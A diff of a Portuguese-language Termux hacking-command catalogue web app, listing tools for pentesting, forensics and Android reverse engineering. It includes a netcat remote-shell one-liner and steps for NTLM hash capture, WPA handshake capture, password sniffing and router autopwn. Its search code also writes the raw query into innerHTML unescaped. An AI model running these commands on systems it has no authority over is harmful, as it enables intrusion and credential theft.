+  { c:"rede_avan_ada", i:"\ud83d\udef0\ufe0f", n:"netcat (nc) - Ouvir portas e transferir", d:"Ouvir: nc -lvnp 4444",
+    tags:["netcat", "nc", "porta", "shell"],
+    s:["Comando: <code>nc -lvnp 4444   # ouvir</code>", "Ouvir: nc -lvnp 4444", "Conectar: nc alvo.com 4444", "Shell remoto: nc SEU_IP 4444 -e /bin/sh", "Transferir: nc alvo 4444 < arquivo"] },
+  { c:"rede_avan_ada", i:"\ud83d\udef0\ufe0f", n:"ncat - Netcat com criptografia", d:"Instale: sudo apt install ncat",
+    tags:["ncat", "nc alternativo", "criptografado"],
+    s:["Comando: <code>ncat --ssl -l -p 4444</code>", "Instale: sudo apt install ncat", "Ouvir com SSL: ncat --ssl -l -p 4444", "Conectar: ncat --ssl alvo.com 4444", "Útil para canal criptografado em teste autorizado."] },
+  { c:"rede_avan_ada", i:"\ud83d\udef0\ufe0f", n:"responder - Capturar hashes NTLM na rede", d:"Rode: sudo responder -I eth0 (na interface da rede).",
+    tags:["responder", "llmnr", "ntlm", "hash capture"],
+    s:["Comando: <code>sudo responder -I eth0</code>", "Rode: sudo responder -I eth0 (na interface da rede).", "Ele responde a consultas LLMNR/NBT-NS e captura hashes NTLM.", "Use com hashcat/john para quebrar o hash.", "Somente em rede própria/autoriada."] },
+  { c:"an_lise_de_tr_fego", i:"\ud83d\udcca", n:"ngrep - Buscar strings em pacotes", d:"Instale: sudo apt install ngrep",
+    tags:["ngrep", "grep de rede", "string em pacote"],
+    s:["Comando: <code>sudo ngrep -q 'password' -d eth0</code>", "Instale: sudo apt install ngrep", "Rode: sudo ngrep -q 'password' -d eth0", "Ele procura strings específicas no tráfego em tempo real.", "Use em rede própria para teste."] },
+  { c:"an_lise_de_tr_fego", i:"\ud83d\udcca", n:"arpwatch - Monitorar mudan\u00e7as ARP", d:"Instale: sudo apt install arpwatch",
+    tags:["arpwatch", "monitorar arp", "detectar spoof"],
+    s:["Comando: <code>sudo arpwatch -i eth0</code>", "Instale: sudo apt install arpwatch", "Rode: sudo arpwatch -i eth0", "Ele detecta mudanças de endereço ARP (possível ARP spoofing).", "Verifique o log /var/log/messages ou /var/lib/arpwatch."] },
+  { c:"an_lise_de_tr_fego", i:"\ud83d\udcca", n:"tcptraceroute - Traceroute via TCP", d:"Instale: sudo apt install tcptraceroute",
+    tags:["tcptraceroute", "traceroute tcp", "firewall"],
+    s:["Comando: <code>tcptraceroute alvo.com 80</code>", "Instale: sudo apt install tcptraceroute", "Rode: tcptraceroute alvo.com 80", "Usa TCP (porta específica) em vez de ICMP, atravessa firewalls melhor.", "Ótimo para mapear rede atrás de filtros."] },
+  { c:"forense_digital", i:"\ud83d\udd2c", n:"Autopsy - An\u00e1lise forense de disco", d:"Instale: sudo apt install autopsy",
+    tags:["autopsy", "análise forense", "disco"],
+    s:["Pré-requisito: é um app com interface gráfica — rode dentro de um desktop (Kali/Ubuntu via VNC ou Termux:X11), não no Termux puro.", "1. Atualize os pacotes: <code>sudo apt update && sudo apt upgrade -y</code>", "2. Instale o Java (obrigatório): <code>sudo apt install openjdk-17-jre -y</code>", "3. Instale o Autopsy: <code>sudo apt install autopsy -y</code>", "4. Verifique a instalação: <code>autopsy --version</code>", "5. Execute: <code>autopsy</code>", "6. Abra no navegador do desktop: <code>http://localhost:9999/autopsy</code>", "7. Crie um novo caso (New Case) e adicione a imagem de disco (.dd/.img).", "8. Analise: arquivos apagados, histórico do navegador, metadados, linha do tempo.", "Alternativa só-Termux (linha de comando): <code>pkg install sleuthkit -y</code> e use <code>fls imagem.dd</code> para listar arquivos.", "💡 Respeite a cadeia de custódia: sempre trabalhe sobre uma CÓPIA da imagem, nunca no disco original."] },
+  { c:"forense_digital", i:"\ud83d\udd2c", n:"dd - Criar imagem de disco", d:"Identifique o disco: sudo fdisk -l",
+    tags:["dd", "copiar disco", "imagem forense"],
+    s:["O dd já vem instalado na maioria dos sistemas. Se faltar: <code>pkg install coreutils -y</code> (Termux) ou <code>sudo apt install coreutils -y</code> (Linux).", "1. Verifique a versão: <code>dd --version</code>", "2. Liste os discos para achar o correto: <code>sudo fdisk -l</code>", "3. (Recomendado) Apague o cache antes de copiar: <code>sync</code>", "4. Crie a imagem do disco: <code>sudo dd if=/dev/sda of=/tmp/imagem.dd bs=4M status=progress</code>", "5. Aguarde terminar e verifique o resultado: <code>ls -lh /tmp/imagem.dd</code>", "6. Gere o hash para provar integridade: <code>sha256sum /tmp/imagem.dd</code>", "7. (Opcional) Comprimir a imagem: <code>gzip -k /tmp/imagem.dd</code>", "⚠️ NUNCA inverta o if (entrada) e o of (saída) — isso sobrescreve o disco. Sempre confira antes de rodar.", "💡 No Termux puro o acesso a disco bruto exige root; para arquivos comuns o dd funciona normalmente."] },
+  { c:"forense_digital", i:"\ud83d\udd2c", n:"hashdeep - Verificar integridade", d:"Rode: hashdeep -a /pasta > hashes.txt",
+    tags:["hashdeep", "hash", "integridade", "comparar"],
+    s:["1. Instale (Linux/Kali): <code>sudo apt install hashdeep -y</code>", "2. No Termux: <code>pkg install hashdeep -y</code> (se indisponível, use <code>sha256sum</code>)", "3. Verifique: <code>hashdeep -V</code>", "4. Gere hashes de uma pasta inteira (recursivo): <code>hashdeep -r /caminho > hashes.txt</code>", "5. Gere com SHA-256: <code>hashdeep -c sha256 -r /caminho > hashes.txt</code>", "6. Saída em CSV: <code>hashdeep -c sha256 -r -l /caminho > hashes.csv</code>", "7. Depois, para AUDITAR (detectar alterações): <code>hashdeep -a -k hashes.txt /caminho</code>", "8. O comando lista arquivos novos, alterados e removidos desde a primeira coleta.", "💡 Use para provar que uma evidência não foi alterada (integridade forense)."] },
+  { c:"sistema_controle", i:"\u2699\ufe0f", n:"crontab - Agendar tarefas", d:"Rode: crontab -e para editar.",
+    tags:["crontab", "agendar tarefa", "persistência"],
+    s:["Comando: <code>crontab -e</code>", "Rode: crontab -e para editar.", "Adicione linha: * * * * * comando", "Isso roda o comando a cada minuto.", "Use para automação legítima."] },
+  { c:"sistema_controle", i:"\u2699\ufe0f", n:"systemctl - Gerenciar servi\u00e7os", d:"status: sudo systemctl status ssh",
+    tags:["systemctl", "serviços", "habilitar"],
+    s:["Comando: <code>sudo systemctl status ssh</code>", "status: sudo systemctl status ssh", "habilitar: sudo systemctl enable ssh", "iniciar: sudo systemctl start ssh", "parar: sudo systemctl stop ssh"] },
+  { c:"wireless_avan_ado", i:"\ud83d\udcfb", n:"hcxdumptool - Capturar PMKID/handshakes", d:"Instale: sudo apt install hcxdumptool",
+    tags:["hcxdumptool", "wpa", "pmkid", "captura"],
+    s:["Comando: <code>sudo hcxdumptool -i wlan0 -o dump.pcapng</code>", "Instale: sudo apt install hcxdumptool", "Rode: sudo hcxdumptool -i wlan0 -o dump.pcapng", "Captura handshakes e PMKIDs de redes próximas.", "Depois converta com hcxpcapngtool e quebre com hashcat.", "Somente em rede própria/autoriada."] },
+  { c:"wireless_avan_ado", i:"\ud83d\udcfb", n:"airdecap-ng - Descriptografar pcap wifi", d:"Rode: airdecap-ng -e SSID captura.pcap",
+    tags:["wireshark", "airdecap", "decrypt", "pcap"],
+    s:["Comando: <code>airdecap-ng -p senha -E SSID captura.pcap</code>", "Rode: airdecap-ng -e SSID captura.pcap", "Se tiver a senha, use -p senha", "Gera arquivo decodificado para análise."] },
+  { c:"hacking_android", i:"\ud83d\udcf1", n:"AndroNix - Kali/Termux no Android (root)", d:"Rode: apt update",
+    tags:["andronix", "kali no android", "hackear android"],
+    s:["Comando: <code>apt update</code>", "Rode: apt update", "Instale: apt install andronix (ou baixe o app).", "Execute o setup e escolha Kali.", "Permite rodar Kali com mais controle no Android."] },
+  { c:"cracking_android", i:"\ud83d\udcf2", n:"apktool - Decompilar APK de apps", d:"Instale: pkg install apktool -y (ou apt no Kali).",
+    tags:["apktool", "decompilar apk", "engenharia reversa"],
+    s:["1. Instale o Java: <code>pkg install openjdk-17 -y</code> (Termux) ou <code>sudo apt install default-jre -y</code> (Linux)", "2. Instale o aapt: <code>pkg install aapt -y</code>", "3. Instale o apktool (Termux): <code>pkg install apktool -y</code>", "4. Instale no Kali/Ubuntu: <code>sudo apt install apktool -y</code>", "5. Verifique: <code>apktool --version</code>", "6. DECODIFICAR um APK: <code>apktool d app.apk -o saida</code>", "7. O conteúdo sai em smali/ (código) e res/ (recursos) — abra e analise.", "8. RECOMPILAR depois de editar: <code>apktool b saida -o novo.apk</code>", "9. ASSINAR o novo APK: <code>apksigner sign --ks chave.jks novo.apk</code>", "💡 Use apenas em apps que você tem direito de analisar."] },
+  { c:"cracking_android", i:"\ud83d\udcf2", n:"jadx - Decompilar APK para Java", d:"Instale: apt install jadx",
+    tags:["jadx", "decompilar java", "apk para java"],
+    s:["1. Instale o Java: <code>pkg install openjdk-17 -y</code> ou <code>sudo apt install default-jre -y</code>", "2. Instale no Kali/Ubuntu: <code>sudo apt install jadx -y</code>", "3. Alternativa manual: baixe o .zip de github.com/skylot/jadx/releases, extraia e dê permissão: <code>chmod +x jadx bin/jadx</code>", "4. Verifique: <code>jadx --version</code>", "5. Modo linha de comando (funciona no Termux): <code>jadx -d saida app.apk</code>", "6. Ver só o código: <code>jadx --no-res -d saida app.apk</code>", "7. Modo gráfico (precisa de desktop/VNC): <code>jadx-gui</code>", "8. Saída: o APK vira código Java legível na pasta \"saida\".", "💡 Excelente para análise de segurança de apps Android."] },
+  { c:"cracking_android", i:"\ud83d\udcf2", n:"dex2jar - Converter DEX para JAR", d:"Instale: apt install dex2jar",
+    tags:["dex2jar", "dex para jar", "classes"],
+    s:["1. Pré-requisito: Java instalado (<code>pkg install openjdk-17 -y</code> ou <code>sudo apt install default-jre -y</code>)", "2. Instale via apt (Kali/Ubuntu): <code>sudo apt install dex2jar -y</code>", "3. Ou baixe do GitHub: <code>git clone https://github.com/pxb1988/dex2jar.git</code>", "4. Entre e dê permissão: <code>cd dex2jar && chmod +x d2j-*</code>", "5. Verifique: <code>d2j-dex2jar --help</code>", "6. CONVERTER o APK para JAR: <code>d2j-dex2jar app.apk -o app.jar</code>", "7. Abra o app.jar num decompilador (jadx-gui, JD-GUI ou Luyten) para ver o Java.", "8. Recurso extra: <code>d2j-dex2smali app.apk</code> para gerar smali.", "💡 dex2jar converte; o jadx já faz tudo em um passo — use os dois conforme a necessidade."] },
+  { c:"ciberataques", i:"\u2694\ufe0f", n:"\u26a0\ufe0f Ataque DDoS \u2014 foco em DEFESA", d:"Ataque de nega\u00e7\u00e3o de servi\u00e7o. Apresentado para voc\u00ea saber DETECTAR e MITIGAR.",
+    tags:["ddos", "ataque de negação", "stress test"],
+    s:["Entenda: DDoS inunda um serviço com tráfego para derrubá-lo.", "Defesa: use WAF e rate limiting (Cloudflare, AWS WAF).", "Defesa: proteção anti-DDoS (AWS Shield, Azure DDoS Protection).", "Defesa: monitore picos de tráfego e alerte automaticamente.", "⚠️ Executar DDoS contra terceiros é crime."] },
+  { c:"ciberataques", i:"\u2694\ufe0f", n:"\u26a0\ufe0f Ataque DDoS \u2014 foco em DEFESA", d:"Ataque de nega\u00e7\u00e3o de servi\u00e7o. Apresentado para voc\u00ea saber DETECTAR e MITIGAR.",
+    tags:["dunder", "ddos", "tcp flood"],
+    s:["Entenda: DDoS inunda um serviço com tráfego para derrubá-lo.", "Defesa: use WAF e rate limiting (Cloudflare, AWS WAF).", "Defesa: proteção anti-DDoS (AWS Shield, Azure DDoS Protection).", "Defesa: monitore picos de tráfego e alerte automaticamente.", "⚠️ Executar DDoS contra terceiros é crime."] },
+  { c:"ciberataques", i:"\u2694\ufe0f", n:"\u26a0\ufe0f Bombardeio de e-mail \u2014 DEFESA", d:"Envio massivo de e-mails para sobrecarregar uma caixa. Foco defensivo.",
+    tags:["smtp", "email bomb", "spam"],
+    s:["Entenda: envia milhares de mensagens para esgotar a caixa.", "Defesa: filtros antispam e rate limiting no SMTP.", "Defesa: use SPF, DKIM e DMARC no seu domínio.", "Defesa: bloqueie remetentes e ative quarentena.", "⚠️ Bombardear terceiros é crime."] },
+  { c:"reconhecimento_avan_ado", i:"\ud83c\udfaf", n:"amass - Enumera\u00e7\u00e3o de subdom\u00ednios", d:"Instale: apt install amass",
+    tags:["amass", "subdominios", "enumeração"],
+    s:["Comando: <code>amass enum -passive -d alvo.com</code>", "Instale: apt install amass", "Rode: amass enum -passive -d alvo.com", "Descobre subdomínios via fontes passivas.", "Use -active para teste mais agressivo."] },
+  { c:"reconhecimento_avan_ado", i:"\ud83c\udfaf", n:"subfinder - Descobrir subdom\u00ednios r\u00e1pido", d:"Instale: go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
+    tags:["subfinder", "subdominio", "rapido"],
+    s:["Comando: <code>subfinder -d alvo.com -silent</code>", "Instale: go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest", "Rode: subfinder -d alvo.com", "Use -silent para só a lista de nomes."] },
+  { c:"reconhecimento_avan_ado", i:"\ud83c\udfaf", n:"nuclei - Scanner de vulnerabilidades", d:"Instale: go install .../projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+    tags:["nuclei", "scanner vulnerabilidade", "templates"],
+    s:["Comando: <code>nuclei -u http://alvo.com -t cves/</code>", "Instale: go install .../projectdiscovery/nuclei/v3/cmd/nuclei@latest", "Rode: nuclei -u http://alvo.com", "Usa templates de CVEs e falhas.", "Somente em hosts autorizados."] },
+  { c:"ataques_de_rede", i:"\ud83d\udd78\ufe0f", n:"\u26a0\ufe0f Captura de senhas \u2014 DEFESA", d:"Fareja credenciais em rede. Foco defensivo.",
+    tags:["ettercap", "mitm", "sniff", "arp"],
+    s:["Entenda: captura tráfego para achar senhas em texto claro.", "Defesa: use HTTPS e SSH sempre (tráfego cifrado).", "Defesa: evite redes Wi-Fi abertas; use VPN.", "Defesa: use autenticação com 2FA.", "⚠️ Espionar redes alheias é crime."] },
+  { c:"ataques_de_rede", i:"\ud83d\udd78\ufe0f", n:"\u26a0\ufe0f Captura de senhas \u2014 DEFESA", d:"Fareja credenciais em rede. Foco defensivo.",
+    tags:["dsniff", "capturar senha", "mitm"],
+    s:["Entenda: captura tráfego para achar senhas em texto claro.", "Defesa: use HTTPS e SSH sempre (tráfego cifrado).", "Defesa: evite redes Wi-Fi abertas; use VPN.", "Defesa: use autenticação com 2FA.", "⚠️ Espionar redes alheias é crime."] },
+  { c:"ataques_de_rede", i:"\ud83d\udd78\ufe0f", n:"\u26a0\ufe0f Inunda\u00e7\u00e3o de pacotes \u2014 DEFESA", d:"Envio massivo de pacotes para esgotar recursos. Foco defensivo.",
+    tags:["macof", "flood mac", "switch"],
+    s:["Entenda: sobrecarrega a rede/dispositivo com pacotes.", "Defesa: rate limiting e QoS no roteador.", "Defesa: port security e proteção contra MAC flood.", "Defesa: monitoramento de tráfego anômalo.", "⚠️ Atacar redes alheias é crime."] },
+  { c:"reverse_shell_c2", i:"\ud83d\udd04", n:"\u26a0\ufe0f Reverse Shell \u2014 DEFESA", d:"Conex\u00e3o de sa\u00edda que d\u00e1 acesso remoto. Foco em DETEC\u00c7\u00c3O.",
+    tags:["msfvenom", "reverse shell", "payload"],
+    s:["Entenda: o alvo se conecta de volta ao atacante (porta de saída).", "Defesa: monitore conexões de saída incomuns.", "Defesa: firewall com regras de saída restritas.", "Defesa: IDS/IPS e alertas de processos suspeitos.", "⚠️ Invadir sistemas é crime."] },
+  { c:"reverse_shell", i:"\ud83d\udc1a", n:"\u26a0\ufe0f Reverse Shell \u2014 DEFESA", d:"Conex\u00e3o de sa\u00edda que d\u00e1 acesso remoto. Foco em DETEC\u00c7\u00c3O.",
+    tags:["bash reverse", "one liner", "netcat"],
+    s:["Entenda: o alvo se conecta de volta ao atacante (porta de saída).", "Defesa: monitore conexões de saída incomuns.", "Defesa: firewall com regras de saída restritas.", "Defesa: IDS/IPS e alertas de processos suspeitos.", "⚠️ Invadir sistemas é crime."] },
+  { c:"termux_setup", i:"\ud83d\udda5\ufe0f", n:"Tool-X - Kit com +100 ferramentas de hacking", d:"Use apenas em redes/dispositivos pr\u00f3prios ou com autoriza\u00e7\u00e3o.",
+    tags:["tool-x", "kit hacking", "instalar", "automacao"],
+    s:["Comando: <code>pkg update && pkg upgrade -y</code>", "Atualize o Termux: pkg update && pkg upgrade -y", "Instale o python e o git: pkg install -y python git", "Clone o repositório: git clone https://github.com/rajkumardusad/Tool-X.git", "Entre na pasta: cd Tool-X", "Execute o instalador: chmod +x install && bash install", "Rode: Tool-X para abrir o menu"] },
+  { c:"termux_setup", i:"\ud83d\udda5\ufe0f", n:"\u26a0\ufe0f Phishing \u2014 conscientiza\u00e7\u00e3o", d:"Clonagem de p\u00e1ginas para roubar credenciais. Use s\u00f3 para TREINAMENTO autorizado.",
+    tags:["zphisher", "phishing", "install", "pagina clone"],
+    s:["Entenda: página falsa imita um site real para capturar login.", "Defesa: verifique sempre a URL antes de digitar senha.", "Defesa: ative 2FA (mesmo com senha roubada, dificulta).", "Defesa: treine sua equipe/família a reconhecer golpes.", "⚠️ Usar phishing contra pessoas é crime."] },
+  { c:"termux_setup", i:"\ud83d\udda5\ufe0f", n:"\u26a0\ufe0f Phishing \u2014 conscientiza\u00e7\u00e3o", d:"Clonagem de p\u00e1ginas para roubar credenciais. Use s\u00f3 para TREINAMENTO autorizado.",
+    tags:["socialfish", "phishing", "install", "clone pagina"],
+    s:["Entenda: página falsa imita um site real para capturar login.", "Defesa: verifique sempre a URL antes de digitar senha.", "Defesa: ative 2FA (mesmo com senha roubada, dificulta).", "Defesa: treine sua equipe/família a reconhecer golpes.", "⚠️ Usar phishing contra pessoas é crime."] },
+  { c:"termux_setup", i:"\ud83d\udda5\ufe0f", n:"RouterSploit - Exploit de roteadores", d:"Explora\u00e7\u00e3o de roteadores. Apenas em equipamentos pr\u00f3prios ou com autoriza\u00e7\u00e3o.",
+    tags:["routersploit", "roteador", "exploit", "pentest"],
+    s:["Comando: <code>git clone https://github.com/threat9/routersploit.git</code>", "Clone: git clone https://github.com/threat9/routersploit.git", "Entre: cd routersploit", "Instale dependências: pip3 install -r requirements.txt", "Inicie: python3 rsf.py", "Use 'use scanners/autopwn' e 'set target <IP>'"] },
+  { c:"reconhecimento_avan_ado", i:"\ud83c\udfaf", n:"ReconBot - Reconhecimento automatizado", d:"Recon automatizado. Use apenas contra alvos autorizados.",
+    tags:["reconbot", "recon", "automatizado", "osint"],
+    s:["Comando: <code>git clone https://github.com/R3x-5rc4m/ReconBot.git</code>", "Clone: git clone .../ReconBot.git", "Entre: cd ReconBot && pip3 install -r requirements.txt", "Rode: python3 reconbot.py", "Escolha o tipo de recon e informe o alvo"] },
+  { c:"ia_local", i:"\ud83e\udd16", n:"CODEX - Agente de c\u00f3digo da OpenAI (Termux)", d:"Requer conta/chave OpenAI (paga). Executa c\u00f3digo localmente no terminal.",
+    tags:["codex", "openai", "codigo", "ai"],
+    s:["1. Atualize o Termux: <code>pkg update && pkg upgrade -y</code>", "2. Instale o Node.js LTS: <code>pkg install nodejs-lts -y</code>", "3. Verifique o Node e o npm: <code>node -v && npm -v</code>", "4. Instale o Codex (versão para Termux): <code>npm install -g @mmmbuto/codex-cli-termux@latest</code>", "5. Confirme a instalação: <code>codex --version</code>", "6. Faça login na sua conta: <code>codex login</code>", "7. Entre num projeto e rode: <code>codex</code>", "8. Descreva a tarefa em linguagem natural — ele lê e edita os arquivos do projeto.", "💡 Requer conta/API da OpenAI. Use em projetos seus."] },
+  { c:"ia_local", i:"\ud83e\udd16", n:"Claude Code - Agente de c\u00f3digo da Anthropic", d:"Requer conta Anthropic (paga). Agente de c\u00f3digo no terminal.",
+    tags:["claude code", "anthropic", "agente", "codigo"],
+    s:["1. Atualize o Termux: <code>pkg update && pkg upgrade -y</code>", "2. Instale o Node.js LTS: <code>pkg install nodejs-lts -y</code>", "3. Verifique: <code>node -v && npm -v</code>", "4. Instale o Claude Code: <code>npm install -g @anthropic-ai/claude-code</code>", "5. Confirme: <code>claude --version</code>", "6. Rode na pasta do projeto: <code>claude</code>", "7. Faça login com sua conta Anthropic quando solicitado.", "8. Descreva a tarefa; ele analisa, edita arquivos e roda comandos com a sua aprovação.", "💡 Requer conta Anthropic (Claude Pro/API). Rode dentro de um repositório git."] },
+  { c:"ia_local", i:"\ud83e\udd16", n:"Aider - Assistente de c\u00f3digo em Python", d:"Aider edita c\u00f3digo direto no seu reposit\u00f3rio git. Requer chave de API de um modelo LLM.",
+    tags:["aider", "ia", "codigo", "python"],
+    s:["1. Atualize os pacotes: <code>pkg update && pkg upgrade -y</code>", "2. Instale o Python e o pip: <code>pkg install python python-pip -y</code>", "3. Verifique: <code>python --version && pip --version</code>", "4. Instale o Aider: <code>pip install aider-chat</code>", "5. Confirme: <code>aider --version</code>", "6. Configure a chave da API (use a sua, nunca compartilhe): <code>export OPENAI_API_KEY=SUA_CHAVE_AQUI</code>", "7. Entre num repositório git e rode: <code>aider</code>", "8. Peça mudanças; ele edita os arquivos e cria commits automaticamente.", "9. Adicione arquivos específicos: <code>aider arquivo1.py arquivo2.py</code>", "💡 Suporta vários provedores (OpenAI, Anthropic, Gemini, modelos locais)."] },
+  { c:"ia_local", i:"\ud83e\udd16", n:"OpenCode - Agente de c\u00f3digo universal (open source)", d:"Agente open source com v\u00e1rios provedores. Requer credencial de um modelo de IA.",
+    tags:["opencode", "coding", "agente", "ia"],
+    s:["1. Atualize o Termux: <code>pkg update && pkg upgrade -y</code>", "2. Instale o Node.js LTS: <code>pkg install nodejs-lts -y</code>", "3. Verifique: <code>node -v && npm -v</code>", "4. Instale o OpenCode: <code>npm install -g opencode-ai</code>", "5. Confirme: <code>opencode --version</code>", "6. Configure um provedor de IA (OpenAI, Anthropic, Gemini ou modelo local via Ollama): <code>opencode auth login</code>", "7. Entre no projeto e rode: <code>opencode</code>", "8. Descreva a tarefa no terminal; ele trabalha no código do projeto.", "💡 É open source e aceita vários provedores — inclusive um Ollama local, sem custo."] },
+];
+
+const CATS = [
+  { id:'todos', label:'✨ Todos' },
+  { id:'termux_setup', label:'🖥️ Termux Setup' },
+  { id:'rede', label:'📡 Rede' },
+  { id:'wifi', label:'📶 Wifi' },
+  { id:'ataques_web', label:'🌐 Ataques Web' },
+  { id:'senhas', label:'🔑 Senhas' },
+  { id:'explora_o', label:'💥 Exploração' },
+  { id:'enumera_o', label:'🔎 Enumeração' },
+  { id:'anonimato', label:'🕶️ Anonimato' },
+  { id:'forense', label:'🧩 Forense' },
+  { id:'criptografia', label:'🔐 Criptografia' },
+  { id:'an_lise_de_malware', label:'🦠 Análise de Malware' },
+  { id:'pen_testing_python', label:'🐍 Pen-testing (Python)' },
+  { id:'ia_local', label:'🤖 IA Local' },
+  { id:'bloqueio_defesa', label:'🛡️ Bloqueio/Defesa' },
+  { id:'mais_ferramentas', label:'🧰 Mais Ferramentas' },
+  { id:'engenharia_social', label:'🎭 Engenharia Social' },
+  { id:'spyware_espionagem', label:'👁️ Spyware / Espionagem' },
+  { id:'rede_avan_ada', label:'🛰️ Rede Avançada' },
+  { id:'an_lise_de_tr_fego', label:'📊 Análise de Tráfego' },
+  { id:'forense_digital', label:'🔬 Forense Digital' },
+  { id:'sistema_controle', label:'⚙️ Sistema / Controle' },
+  { id:'wireless_avan_ado', label:'📻 Wireless Avançado' },
+  { id:'hacking_android', label:'📱 Hacking Android' },
+  { id:'cracking_android', label:'📲 Cracking Android' },
+  { id:'ciberataques', label:'⚔️ Ciberataques' },
+  { id:'reconhecimento_avan_ado', label:'🎯 Reconhecimento Avançado' },
+  { id:'ataques_de_rede', label:'🕸️ Ataques de Rede' },
+  { id:'reverse_shell_c2', label:'🔄 Reverse Shell / C2' },
+  { id:'reverse_shell', label:'🐚 Reverse Shell' }
+];
+
+// ============================================================
+// LÓGICA EMULAÇÃO
+// ============================================================
+const DISTRO_METHODS = {
+  kali: ['proot','vnc','x11','nethunter','andronix','cloud'],
+  ubuntu: ['proot','vnc','x11','andronix','cloud'],
+  debian: ['proot','vnc','x11','andronix','cloud'],
+  xfce: ['vnc','x11','andronix'],
+  linux: ['proot','vnc','x11','andronix','cloud'],
+  windows: ['winlator','wine','cloud','remote']
+};
+
+let currentDistro = 'kali';
+
+function pickDistro(d, el) {
+  currentDistro = d;
+  document.querySelectorAll('.distro-btn').forEach(b => b.classList.remove('active'));
+  el.classList.add('active');
+  renderMethods();
 }
 
-// SNAPSHOT: guarda todos os cards uma única vez ao carregar.
-// Sempre filtra a partir daqui, e NUNCA do DOM vivo (que muda ao filtrar).
-var ALL_CARDS = Array.prototype.slice.call(document.querySelectorAll('.card'));
-function cards(){
-  // retorna cópias novas dos cards completos, sem tocar no que está na tela
-  var tmp = document.createElement('div');
-  tmp.innerHTML = ALL_CARDS.map(function(c){ return c.outerHTML; }).join('');
-  return Array.prototype.slice.call(tmp.querySelectorAll('.card'));
+function renderMethods() {
+  const ids = DISTRO_METHODS[currentDistro] || [];
+  const wrap = document.getElementById('distro-panels');
+  wrap.innerHTML = ids.map((id, idx) => {
+    const m = METHODS[id];
+    return `
+    <div class="method-card ${idx===0?'open':''}">
+      <div class="method-head" onclick="toggleMethod(this)">
+        <div class="method-ico ${m.cls}">${m.ico}</div>
+        <div class="method-meta">
+          <div class="method-name">${m.name}</div>
+          <div class="method-sub">${m.sub}</div>
+        </div>
+        <span class="lvl ${m.lvlc}">${m.lvl}</span>
+      </div>
+      <div class="method-body">
+        ${m.body}
+      </div>
+    </div>`;
+  }).join('');
 }
 
-// destaca um termo no HTML de um card, respeitando tags
-function highlightCard(html, term){
-  var t = normalize(term);
-  if(!t) return html;
-  // isola texto entre tags e aplica mark quando casar
-  return html.replace(/(>)([^<>]+)(<)/g, function(m, o, mid, c){
-    var out = ''; var norm = normalize(mid); var i=0;
-    while(i < mid.length){
-      var idx = norm.indexOf(t, i);
-      if(idx === -1){ out += mid.slice(i); break; }
-      out += mid.slice(i, idx) + '<mark>' + mid.slice(idx, idx+t.length) + '</mark>';
-      i = idx + t.length;
+function toggleMethod(el) {
+  el.parentElement.classList.toggle('open');
+}
+
+// ============================================================
+// LÓGICA COMANDOS (busca + categoria + destaque + cópia)
+// ============================================================
+let activeCat = 'todos';
+let query = '';
+
+function normalize(s) {
+  return s.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
+}
+
+function highlightText(text, term) {
+  if (!term) return text;
+  const nt = normalize(term);
+  if (!nt) return text;
+  const nText = normalize(text);
+  // tenta mapear índices quando comprimentos batem (acentos preservados)
+  let out = '';
+  let i = 0;
+  while (i < text.length) {
+    if (nText.substr(i, nt.length) === nt && i + nt.length <= text.length) {
+      out += '<mark>' + text.substr(i, nt.length) + '</mark>';
+      i += nt.length;
+    } else {
+      out += text[i];
+      i++;
     }
-    return o + out + c;
-  });
+  }
+  return out;
 }
 
-function render(term){
-  term = (term||'').trim();
-  var all = cards();
-  var box = document.getElementById('results');
-  var count = document.getElementById('count');
-  if(!term){
-    box.innerHTML = all.map(function(c){return c.outerHTML;}).join('');
-    count.textContent = all.length + ' comandos disponíveis';
+function renderCats() {
+  const bar = document.getElementById('cat-bar');
+  bar.innerHTML = CATS.map(c =>
+    `<button class="cat-chip ${c.id===activeCat?'active':''}" onclick="setCat('${c.id}')">${c.label}</button>`
+  ).join('');
+}
+
+function setCat(id) { activeCat = id; renderCats(); renderCmds(); }
+
+function renderCmds() {
+  const q = normalize(query.trim());
+  let list = COMMANDS.filter(c => activeCat === 'todos' || c.c === activeCat);
+  if (q) {
+    list = list.filter(c => {
+      const hay = normalize(c.n + ' ' + c.d + ' ' + c.tags.join(' ') + ' ' + c.s.join(' '));
+      return hay.includes(q);
+    });
+  }
+  document.getElementById('count-info').innerHTML = `<b>${list.length}</b> comando(s) encontrado(s)`;
+  const wrap = document.getElementById('cmd-list');
+  if (!list.length) {
+    wrap.innerHTML = `<div class="alert alert-info">Nenhum comando encontrado para "<b>${query}</b>". Tente outro termo.</div>`;
     return;
   }
-  var found = all.filter(function(c){ return normalize(c.textContent).indexOf(normalize(term)) !== -1; });
-  if(found.length===0){
-    box.innerHTML = '<p class="empty">Nenhum comando encontrado para "'+term+'". Tente: sqlmap, wifi, senha, openssl, yara...</p>';
-  } else {
-    box.innerHTML = found.map(function(c){ return highlightCard(c.outerHTML, term); }).join('');
-  }
-  count.textContent = found.length + ' resultado(s)';
+  wrap.innerHTML = list.map((c, i) => `
+    <div class="cmd-card" data-idx="${i}">
+      <div class="cmd-head" onclick="toggleCmd(this)">
+        <div class="cmd-ico">${c.i}</div>
+        <div class="cmd-meta">
+          <div class="cmd-name">${highlightText(c.n, query.trim())}</div>
+          <div class="cmd-desc">${highlightText(c.d, query.trim())}</div>
+          <div class="cmd-tags">${c.tags.map(t=>`<span class="tag">${t}</span>`).join('')}</div>
+        </div>
+        <div class="cmd-arrow">▾</div>
+      </div>
+      <div class="cmd-body">
+        <div class="cmd-block">Como usar</div>
+        ${c.s.map((s, n) => `<div class="step"><div class="step-n">${n+1}</div><div class="step-t">${s}</div></div>`).join('')}
+        <div class="cmd-block">Copiar comando principal</div>
+        ${c.tags.slice(0,3).map(t => `<div class="copy-row"><code>${t}</code><button class="copy-btn" onclick="copyText('${t.replace(/'/g,"\\'")}')">Copiar</button></div>`).join('')}
+      </div>
+    </div>
+  `).join('');
 }
 
-function renderCats(){
-  var cats = [];
-  cards().forEach(function(c){ var cat=c.getAttribute('data-cat'); if(cats.indexOf(cat)===-1) cats.push(cat); });
-  var html = '';
-  html += '<button data-cat="all" onclick="filterCat(this)">Todos</button>';
-  cats.forEach(function(cat){ html += '<button data-cat="'+cat+'" onclick="filterCat(this)">'+cat+'</button>'; });
-  document.getElementById('cats').innerHTML = html;
+function toggleCmd(el) {
